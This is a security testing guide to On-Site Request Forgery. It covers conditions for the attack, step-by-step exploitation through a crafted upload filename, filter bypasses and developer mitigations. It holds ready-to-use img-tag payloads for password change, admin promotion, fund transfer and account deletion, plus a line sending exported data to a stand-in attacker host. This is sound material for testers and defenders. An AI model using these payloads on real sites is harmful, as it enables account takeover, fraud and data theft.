
## Overview

On-Site Request Forgery (OSRF) is a web security vulnerability that forces an authenticated user to execute unwanted actions on a web application where they are currently logged in. The key distinction from CSRF (Cross-Site Request Forgery) is:

- **CSRF**: Attacker initiates requests from a domain under their control to perform actions on behalf of the victim
- **OSRF**: Requests originate from the vulnerable application itself, but the attacker controls where these requests are directed

The attack exploits scenarios where user-controlled input is reflected in HTML attributes that trigger HTTP requests (such as `src` attributes), combined with sensitive endpoints that accept GET requests.

## Exploitation Methods

### Prerequisites

Two conditions must be present for OSRF exploitation:

1. **Reflected Input in Request-Triggering Attributes**
   - User input is reflected in `src` or similar attributes that automatically trigger HTTP requests
   - Common vulnerable HTML elements:
     ```html
     <img src="OUR_INPUT_HERE">
     <video width="400" height="200" controls src="OUR_INPUT_HERE">
     <audio src="OUR_INPUT_HERE">
     <iframe src="OUR_INPUT_HERE">
     <script src="OUR_INPUT_HERE">
     <embed src="OUR_INPUT_HERE">
     <object data="OUR_INPUT_HERE">
     <link rel="stylesheet" href="OUR_INPUT_HERE">
     ```

2. **Sensitive Endpoint Using GET Method**
   - State-changing operations accessible via GET requests
   - Example:
     ```http
     GET /settings.php?remove_account=1
     Host: example.com
     ```

### Exploitation Steps

#### Step 1: Identify Vulnerable Endpoints

Find sensitive operations that use GET requests:

```http
GET /change_password.php?new_password=Testing123
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
```

#### Step 2: Locate Input Reflection Point

Find functionality where user input is reflected in `src` attributes. Example with profile photo upload:

```http
POST /settings.php
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Content-Type: multipart/form-data; boundary=---------------------------829348923824

-----------------------------829348923824
Content-Disposition: form-data; name="filename"

testingimage.jpg

-----------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="testingimage.jpg"
Content-Type: image/gif

IMAGE_CONTENT
-----------------------------829348923824--
```

Resulting HTML:

```html
<div id="profile">
  <p id="fullname">daffainfo</p>
  <p id="address">Indonesia</p>
  <img src="uploads/testingimage.jpg">
</div>
```

#### Step 3: Inject Malicious Path

Replace the filename with the path to the sensitive endpoint:

```
filename: ../change_password.php?new_password=Testing123
```

Resulting malicious HTML:

```html
<div id="profile">
  <p id="fullname">daffainfo</p>
  <p id="address">Indonesia</p>
  <img src="../change_password.php?new_password=Testing123">
</div>
```

#### Step 4: Trigger the Attack

When another authenticated user visits the attacker's profile page, their browser automatically sends a request to the sensitive endpoint, executing the unwanted action (e.g., password change).

### Testing Checklist

- [ ] Identify all user-controllable inputs that appear in HTML
- [ ] Check if inputs are reflected in `src`, `href`, `data`, or similar attributes
- [ ] Map all sensitive endpoints (account deletion, password change, email update, etc.)
- [ ] Verify if sensitive endpoints accept GET requests
- [ ] Test path traversal capabilities (`../`, absolute paths)
- [ ] Check if same-origin policy restrictions apply
- [ ] Verify if authentication cookies are sent with the forged request
- [ ] Test if the application validates referer headers
- [ ] Check for any input sanitization or validation

## Bypasses

### Path Traversal Bypass

If the application prepends a directory path, use `../` to navigate:

```
Original: uploads/filename.jpg
Bypass: ../../../sensitive_endpoint.php?action=delete
```

### Protocol Bypass

If the application filters relative paths, try absolute URLs (if same-origin):

```html
<img src="http://example.com/delete_account.php">
<img src="//example.com/delete_account.php">
```

### Filter Evasion

If certain characters are filtered:

```
URL encoding: %2e%2e%2f (../)
Double encoding: %252e%252e%252f
Unicode: %c0%ae%c0%ae/
```

### Content-Type Confusion

Upload files with misleading extensions but containing HTML:

```
filename.jpg.html
filename.jpg%00.html (null byte injection)
```

## Higher Impact Scenarios

### Account Takeover

Chain OSRF with password change or email modification endpoints:

```html
<img src="../change_email.php?new_email=attacker@evil.com">
<img src="../confirm_email.php?token=predicted_token">
```

### Privilege Escalation

Target administrative functions:

```html
<img src="../admin/promote_user.php?user_id=attacker&role=admin">
```

### Mass Data Exfiltration

Trigger data export endpoints:

```html
<img src="../export_data.php?format=csv&redirect=https://attacker.com/collect">
```

### Financial Fraud

Exploit payment or transaction endpoints:

```html
<img src="../transfer_funds.php?amount=1000&to_account=attacker_account">
<img src="../purchase.php?item_id=123&quantity=999">
```

### Social Engineering Amplification

Create self-propagating attacks:

```html
<img src="../share_profile.php?target=all_followers&message=Check+this+out">
```

### API Abuse

Target internal API endpoints:

```html
<img src="../api/v1/users/delete?id=victim_id&confirm=true">
```

### Session Hijacking

Force session-related actions:

```html
<img src="../logout.php">
<img src="../login.php?auto_login=attacker_controlled_session">
```

## Mitigations

### For Developers

1. **Use POST for State-Changing Operations**
    
    - Never use GET requests for sensitive actions
    - Implement proper HTTP method restrictions
2. **Implement CSRF Tokens**
    
    - Add anti-CSRF tokens to all sensitive operations
    - Validate tokens on the server-side
3. **Input Validation and Sanitization**
    
    - Whitelist allowed characters in filenames and paths
    - Validate file extensions and MIME types
    - Reject path traversal sequences (`../`, `..\\`)
4. **Content Security Policy (CSP)**
    
    - Restrict which sources can be loaded
    
    ```
    Content-Security-Policy: img-src 'self' https://trusted-cdn.com;
    ```
    
5. **Validate Referer Headers**
    
    - Check that requests originate from expected pages
    - Implement as secondary defense, not primary
6. **Path Normalization**
    
    - Canonicalize all file paths
    - Reject or sanitize dangerous patterns
7. **Same-Site Cookies**
    
    - Use `SameSite=Strict` or `SameSite=Lax` for session cookies
    
    ```
    Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
    ```
    
8. **Separate Domains for User Content**
    
    - Host user-uploaded content on separate domains
    - Prevents same-origin requests to sensitive endpoints

### For Security Testers

1. **Automated Scanning**
    
    - Scan for GET-based state changes
    - Identify reflected inputs in HTML attributes
2. **Manual Testing Focus Areas**
    
    - File upload functionality
    - Profile/settings pages
    - Avatar/image upload features
    - Custom themes or layouts
    - Markdown/HTML rendering features
3. **Impact Assessment**
    
    - Document the sensitive endpoint accessed
    - Demonstrate the full attack chain
    - Calculate risk based on affected functionality

## References

- [PortSwigger - On-Site Request Forgery](https://portswigger.net/blog/on-site-request-forgery)
- [CM2 Blog - On-Site Request Forgery](https://blog.cm2.pw/articles/on-site-request-forgery/)